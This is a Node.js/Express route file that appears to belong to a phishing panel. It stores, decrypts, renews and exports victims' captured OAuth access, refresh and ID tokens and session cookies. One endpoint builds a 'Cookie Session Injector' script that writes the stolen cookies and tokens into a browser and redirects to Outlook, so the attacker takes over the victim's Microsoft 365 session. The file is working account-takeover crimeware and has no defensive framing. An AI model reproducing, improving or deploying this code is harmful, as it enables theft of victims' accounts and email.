const express = require('express');
const router = express.Router();
const db = require('../database/connection');
const { userAuth } = require('../middleware/auth');
const { encrypt, decrypt } = require('../utils/encrypt');

// Get all tokens for user
router.get('/', userAuth, async (req, res) => {
  try {
    const { sort, search, page = 1, limit = 50 } = req.query;
    let query = 'SELECT id, user_id, link_id, email, token_type, ip_address, user_agent, notes, expiration, last_renewed, renewal_count, stale, deleted, created_at FROM captured_tokens WHERE user_id = ? AND deleted = 0';
    const params = [req.user.id];
    
    if (search) {
      query += ' AND (email LIKE ? OR ip_address LIKE ?)';
      params.push('%' + search + '%', '%' + search + '%');
    }
    
    query += ' ORDER BY created_at ' + (sort === 'oldest' ? 'ASC' : 'DESC');
    const offset = (parseInt(page) - 1) * parseInt(limit);
    query += ' LIMIT ? OFFSET ?';
    params.push(parseInt(limit), offset);
    
    const [tokens] = await db.query(query, params);
    const [countResult] = await db.query('SELECT COUNT(*) as total FROM captured_tokens WHERE user_id = ? AND deleted = 0', [req.user.id]);
    
    res.json({
      tokens: tokens,
      total: countResult[0].total,
      page: parseInt(page),
      pages: Math.ceil(countResult[0].total / parseInt(limit))
    });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Get single token with decrypted data
router.get('/:id', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
    
    const token = tokens[0];
    const decrypted = {
      id: token.id,
      user_id: token.user_id,
      link_id: token.link_id,
      email: token.email,
      token_type: token.token_type,
      ip_address: token.ip_address,
      user_agent: token.user_agent,
      notes: token.notes,
      expiration: token.expiration,
      last_renewed: token.last_renewed,
      renewal_count: token.renewal_count,
      created_at: token.created_at,
      access_token: decrypt(token.access_token_encrypted),
      refresh_token: decrypt(token.refresh_token_encrypted),
      id_token: decrypt(token.id_token_encrypted),
      cookies: decrypt(token.cookies_encrypted)
    };
    
    res.json(decrypted);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Update token notes
router.put('/:id/notes', userAuth, async (req, res) => {
  try {
    const { notes } = req.body;
    await db.query('UPDATE captured_tokens SET notes = ? WHERE id = ? AND user_id = ?', [notes || '', req.params.id, req.user.id]);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Soft delete token
router.delete('/:id', userAuth, async (req, res) => {
  try {
    await db.query('UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Generate cookie script - COMBINES cookies + access_token + refresh_token
router.get('/:id/cookie-script', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
    
    const token = tokens[0];
    var cookies = decrypt(token.cookies_encrypted);
    const accessToken = decrypt(token.access_token_encrypted);
    const refreshToken = decrypt(token.refresh_token_encrypted);
    
    // If no stored cookies, try to convert from access_token
    if ((!cookies || cookies.trim() === '') && accessToken) {
      try {
        const cookieConverter = require('../services/cookieconverter');
        const result = await cookieConverter.convertTokensToCookies(accessToken, token.template_type);
        if (result.success && result.cookies) {
          cookies = result.cookies;
          await db.query('UPDATE captured_tokens SET cookies_encrypted = ?, token_type = ?, last_renewed = NOW(), renewal_count = COALESCE(renewal_count, 0) + 1 WHERE id = ?', [encrypt(cookies), 'cookie', token.id]);
        }
      } catch (convErr) {
        console.error('[Tokens] Cookie conversion error:', convErr.message);
      }
    }
    
    if (!cookies || cookies.trim() === '') {
      return res.status(400).json({ error: 'No cookies available. Please use the Renew button to convert tokens to cookies first.', has_access_token: !!token.access_token_encrypted });
    }
    
    // Build VERY LONG cookie string by combining ALL data
    var parts = [];
    
    // Add stored cookies
    const cookieArray = cookies.split(';').map(function(c) { return c.trim(); }).filter(function(c) { return c; });
    for (var i = 0; i < cookieArray.length; i++) {
      parts.push(cookieArray[i]);
    }
    
    // Add access_token as a cookie value
    if (accessToken) {
      parts.push('access_token=' + accessToken);
    }
    
    // Add refresh_token as a cookie value
    if (refreshToken) {
      parts.push('refresh_token=' + refreshToken);
    }
    
    // Join with & separator for VERY long string like competitor
    var cookieString = parts.join('&');
    
    var script = '// VGenius Cookie Session Injector\n';
    script += '// Automatic redirect in 3 seconds\n\n';
    script += 'var cookieData = "' + cookieString + '";\n\n';
    script += 'var pairs = cookieData.split("&");\n';
    script += 'for (var i = 0; i < pairs.length; i++) {\n';
    script += '  var pair = pairs[i].trim();\n';
    script += '  var eq = pair.indexOf("=");\n';
    script += '  if (eq > 0) {\n';
    script += '    document.cookie = pair.substring(0, eq) + "=" + pair.substring(eq + 1) + "; path=/; expires=Fri, 18 Dec 2099 23:59:59 UTC; secure; SameSite=None";\n';
    script += '  }\n';
    script += '}\n\n';
    script += 'console.log("Cookies injected. Redirecting...");\n';
    script += 'setTimeout(function() {\n';
    script += '  window.location.href = "https://outlook.office365.com/";\n';
    script += '}, 3000);\n';
    
    res.json({ script: script, cookie_count: parts.length, cookies: parts });
  } catch (err) {
    console.error('[Tokens] Cookie script error:', err);
    res.status(500).json({ error: 'Failed to generate script' });
  }
});

// Manual cookie renewal
router.post('/:id/renew', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
    
    const token = tokens[0];
    const accessToken = decrypt(token.access_token_encrypted);
    if (!accessToken) {
      return res.status(400).json({ error: 'No access token available for renewal' });
    }
    
    const cookieConverter = require('../services/cookieconverter');
    const result = await cookieConverter.convertTokensToCookies(accessToken, token.template_type, '', '');
    
    if (result.success && result.cookies) {
      await db.query('UPDATE captured_tokens SET cookies_encrypted = ?, token_type = ?, expiration = DATE_ADD(NOW(), INTERVAL 24 HOUR), last_renewed = NOW(), renewal_count = COALESCE(renewal_count, 0) + 1 WHERE id = ?', [encrypt(result.cookies), 'cookie', token.id]);
      res.json({ success: true, cookies: result.cookies, cookie_count: result.cookies.split(';').filter(function(c) { return c.trim(); }).length });
    } else {
      res.status(400).json({ error: result.error || 'Conversion failed', success: false });
    }
  } catch (err) {
    console.error('[Tokens] Renewal error:', err);
    res.status(500).json({ error: 'Renewal failed: ' + err.message });
  }
});

// Get renewal history
router.get('/:id/renewals', userAuth, async (req, res) => {
  try {
    const [renewals] = await db.query('SELECT * FROM cookie_renewals WHERE capture_id = ? AND user_id = ? ORDER BY created_at DESC LIMIT 50', [req.params.id, req.user.id]);
    res.json(renewals);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Export tokens
router.post('/export', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query('SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at FROM captured_tokens WHERE user_id = ? AND deleted = 0 ORDER BY created_at DESC', [req.user.id]);
    res.json({ tokens: tokens, exported_at: new Date().toISOString(), count: tokens.length });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Export and delete all
router.post('/export-delete-all', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query('SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at FROM captured_tokens WHERE user_id = ? AND deleted = 0', [req.user.id]);
    await db.query('UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE user_id = ? AND deleted = 0', [req.user.id]);
    res.json({ tokens: tokens, exported_at: new Date().toISOString(), count: tokens.length, deleted: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

module.exports = router;
